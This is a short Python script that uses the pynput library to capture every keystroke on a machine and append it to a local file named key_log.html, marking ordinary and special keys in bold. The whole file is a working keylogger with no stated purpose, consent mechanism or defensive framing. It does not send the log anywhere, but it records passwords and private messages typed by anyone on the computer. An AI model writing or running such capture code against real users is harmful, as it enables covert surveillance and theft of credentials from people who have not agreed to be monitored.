from pynput.keyboard import Listener

# Path to the log file (HTML format)
log_file = "key_log.html"

# Function to write the key press to the log file
def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(f"<b>{key.char}</b>")  # Write the key as bold text
    except AttributeError:
        # Handle special keys like shift, enter, etc.
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(f" <b>{key}</b> ")  # Write special keys as bold text

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
